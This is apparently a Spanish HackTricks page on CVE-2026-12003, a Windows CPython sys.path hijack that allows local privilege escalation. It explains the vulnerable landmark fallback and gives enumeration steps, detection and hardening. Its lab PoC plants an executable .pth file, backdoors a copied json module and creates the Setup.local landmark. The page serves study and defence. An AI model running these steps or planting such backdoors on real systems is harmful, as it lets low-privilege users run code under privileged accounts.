# Windows CPython Build-Landmark y secuestro de `sys.path`

{{#include ../../../banners/hacktricks-training.md}}

Un runtime puede conservar rutas relativas que estaban destinadas únicamente a su árbol de compilación. Si un runtime privilegiado instalado resuelve una de esas rutas en un directorio escribible por un usuario con pocos privilegios, un atacante puede colocar el **build landmark** esperado y hacer que el runtime confíe en un prefijo de biblioteca alternativo. CVE-2026-12003 es un ejemplo de Windows CPython: un `Modules\Setup.local` colocado por el atacante puede redirigir la entrada de la biblioteca estándar en `sys.path` sin modificar la instalación protegida de Python.<sup>[[1]](#references)[[2]](#references)</sup>

## Cadena de construcción de rutas de CPython

Las compilaciones de Windows afectadas compilaron `VPATH=..\..` y lo expusieron como `sys._vpath`. El fallback vulnerable en `Modules/getpath.py` trataba `VPATH\Modules\Setup.local` como evidencia de que el intérprete se estaba ejecutando desde un árbol de código fuente; el siguiente flujo de datos convierte ese valor de compilación en una primitiva de búsqueda de rutas en runtime.<sup>[[1]](#references)[[2]](#references)</sup>

| Stage | Derived value for `C:\Program Files\Python314\python.exe` |
| --- | --- |
| Compiled build path | `VPATH=..\..` |
| Runtime build landmark | `C:\Program Files\Python314\..\..\Modules\Setup.local` |
| Attacker-created landmark | `C:\Modules\Setup.local` |
| Selected `build_prefix` | `C:\` |
| Selected standard library | `C:\Lib` |
| Result | Attacker-controlled `C:\Lib` is appended to `sys.path` |

La comprobación es un fallback que se utiliza cuando el archivo `pybuilddir.txt` más específico situado junto al ejecutable no existe o no se puede leer. Esto es importante porque un usuario con pocos privilegios puede no tener capacidad para modificar `C:\Program Files\Python314`, pero aun así puede crear nuevos directorios en `C:\`. Posteriormente, el proceso privilegiado `python.exe` carga código Python utilizando su propio token de acceso.<sup>[[1]](#references)[[2]](#references)</sup>

### Prerequisites

Trata esto como un límite de privilegios únicamente cuando se cumplan todas estas condiciones:<sup>[[1]](#references)[[2]](#references)</sup>

- El objetivo es una compilación afectada de **Windows CPython**; la lógica de rutas vulnerable no es una propiedad del lenguaje Python.
- El directorio obtenido al resolver `..\..` desde el directorio que contiene `python.exe` permite que un usuario con menos privilegios cree el landmark y el árbol `Lib`.
- Posteriormente, un usuario con más privilegios, servicio, instalador o cuenta de despliegue de software inicia ese intérprete.
- Ninguna configuración de aislamiento de rutas anula la ruta de descubrimiento vulnerable.

## Enumeración

Inspecciona tanto el valor compilado como la ruta de búsqueda efectiva. Un valor expuesto `..\..` es una pista útil, pero no demuestra que sea explotable: resuelve también la ruta, comprueba las ACL y confirma que un landmark colocado quedaría fuera de la instalación protegida.<sup>[[1]](#references)[[2]](#references)</sup>
```powershell
python -c "import os,sys; print(sys.executable); print(getattr(sys,'_vpath',None)); print(*sys.path, sep='\n')"

$pythonDir = python -c "import os,sys; print(os.path.dirname(sys.executable))"
$prefix = [IO.Path]::GetFullPath((Join-Path $pythonDir '..\..'))
$prefix
icacls $prefix
```
No restrinjas la evaluación a los instaladores oficiales. Para cada producto que incluya `python.exe`, resuelve su `sys._vpath` en relación con el directorio real del ejecutable y revisa las ACLs de las ubicaciones `Modules` y `Lib` resultantes. Una ruta de instalación más profunda puede resolver a un directorio de aplicación o del proveedor diferente y con permisos de escritura, en lugar de `C:\`.<sup>[[1]](#references)</sup>

## Flujo de explotación en el laboratorio

El siguiente PoC de laboratorio replica suficiente del runtime legítimo por debajo del prefijo seleccionado para que Python se inicialice, añade una línea `.pth` ejecutable y, finalmente, crea el landmark. Crea el payload antes del landmark para evitar que el intérprete apunte temporalmente a un árbol de bibliotecas incompleto.<sup>[[1]](#references)</sup>
```powershell
$pythonDir = python -c "import os,sys; print(os.path.dirname(sys.executable))"
$root = [IO.Path]::GetFullPath((Join-Path $pythonDir '..\..'))
robocopy /E "$pythonDir\Lib" "$root\Lib" | Out-Null
robocopy /E "$pythonDir\DLLs" "$root\Lib" | Out-Null
New-Item "$root\Lib\site-packages" -ItemType Directory -Force | Out-Null
'import subprocess;subprocess.run(["cmd.exe","/c","whoami > %TEMP%\\py-landmark.txt"],shell=False)' |
Set-Content "$root\Lib\site-packages\audit.pth" -Encoding Ascii
New-Item "$root\Modules" -ItemType Directory -Force | Out-Null
New-Item "$root\Modules\Setup.local" -ItemType File -Force | Out-Null
```
Durante la inicialización normal del sitio, Python procesa los archivos `.pth` en los directorios site-packages reconocidos. Solo se ejecutan las líneas que comienzan con `import` seguido de espacios en blanco, y la instrucción ejecutable debe permanecer en una sola línea física; `python -S` suprime la importación automática de `site` y, por tanto, este trigger.<sup>[[1]](#references)[[4]](#references)</sup>

### Alternativa activada por import

No se requiere la ejecución durante el inicio. Después de reproducir el árbol de la biblioteca legítima, añade un backdoor a un módulo que un script privilegiado importe de forma predecible. Por ejemplo, añadir código al `Lib\json\__init__.py` plantado hace que se ejecute cuando la víctima importe `json`; elegir un módulo fiable, pero que no se importe universalmente, puede hacer que el trigger sea menos ruidoso.<sup>[[1]](#references)</sup>
```powershell
'open(r"C:\Windows\Temp\json-import-token.txt","w").write(__import__("subprocess").check_output(["whoami"]).decode())' |
Add-Content "$root\Lib\json\__init__.py" -Encoding Ascii
```
Esta variante aún hereda el token del proceso que realiza la importación, pero depende de que la aplicación objetivo importe el módulo modificado. Conserva el comportamiento del módulo original al probar software real; de lo contrario, la importación puede fallar antes de que se complete el flujo privilegiado previsto.<sup>[[1]](#references)</sup>

## Planting previo a la instalación

El planting mediante la search path puede preceder a la instalación. Un usuario con pocos privilegios puede preparar el árbol `Lib` futuro y `Modules\Setup.local`, y luego esperar a que un portal de software privilegiado, un flujo de trabajo del help desk o un sistema de deployment realice una instalación para todos los usuarios. Los instaladores que ejecutan el nuevo intérprete para instalar paquetes o precompilar la standard library pueden activar el payload bajo la cuenta de deployment sin que un administrador tenga que abrir Python manualmente.<sup>[[1]](#references)</sup>

Esto también cambia la revisión del deployment: inspecciona los ancestros con permisos de escritura y los directorios de landmark/library preexistentes **antes** de instalar o actualizar un runtime incluido, en lugar de comprobar únicamente el directorio de instalación final después del deployment.<sup>[[1]](#references)</sup>

## Detección y hardening

Los pivots útiles en el host son el landmark y el árbol de library inesperados, seguidos del inicio de Python con privilegios. Busca `Modules\Setup.local`, directorios `Lib\site-packages\*.pth` en la raíz o ubicados de forma anómala, paquetes de la standard library copiados y archivos de módulos cuyo propietario o fecha de creación difiera de los de la instalación protegida. Correlaciona su creación por parte de un usuario estándar con un `python.exe` elevado que genere `cmd.exe`, `powershell.exe`, herramientas de administración de cuentas u otros procesos secundarios inusuales.<sup>[[1]](#references)</sup>
```powershell
Get-Item C:\Modules\Setup.local -ErrorAction SilentlyContinue | Format-List FullName,CreationTime,LastWriteTime
Get-ChildItem C:\Lib\site-packages -Filter *.pth -ErrorAction SilentlyContinue |
Select-Object FullName,CreationTime,LastWriteTime
Get-ChildItem C:\Lib -Recurse -File -ErrorAction SilentlyContinue |
Get-Acl | Where-Object Owner -notmatch 'TrustedInstaller|Administrators|SYSTEM'
```
La corrección upstream elimina el fallback `VPATH\Modules\Setup.local` y hace que `pybuilddir.txt` sea el único indicador del árbol de compilación. Prefiere una compilación fija o una instalación por usuario gestionada con el administrador de instalación actual de Python. Cuando actualizar sea temporalmente imposible, protege el ancestro resuelto y precrea `Modules` con ACLs restrictivas; los archivos `._pth` controlados o `PYTHONHOME` también pueden alterar la detección, pero requieren pruebas de compatibilidad de la aplicación.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## References

- [1] [Bishop Fox - CVE-2026-12003: Hijacking de rutas de búsqueda de Windows CPython y escalada de privilegios local](https://bishopfox.com/blog/python-software-foundation-python-3-11-0a3-to-3-15-0b2)
- [2] [CPython issue #151544 - Las rutas de búsqueda dentro del árbol pueden habilitarse sin modificar el directorio de instalación](https://github.com/python/cpython/issues/151544)
- [3] [CPython pull request #151545 - Eliminar el fallback `VPATH/Modules/Setup.local`](https://github.com/python/cpython/pull/151545)
- [4] [Documentación de Python - Archivos de configuración de rutas de `site`](https://docs.python.org/3/library/site.html)
{{#include ../../../banners/hacktricks-training.md}}
